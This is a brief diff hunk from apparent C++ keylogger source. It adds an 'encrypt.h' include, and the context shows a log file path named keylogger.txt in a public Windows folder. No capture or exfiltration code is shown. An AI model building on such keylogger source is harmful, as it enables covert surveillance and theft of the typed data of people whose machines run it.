@@ -3,6 +3,7 @@
 #include <string>
 #include <windows.h>
 #include <sys/stat.h>
+#include "encrypt.h"
 
 #define LOG_FILE "C:\\Users\\Public\\Documents\\keylogger.txt"
 
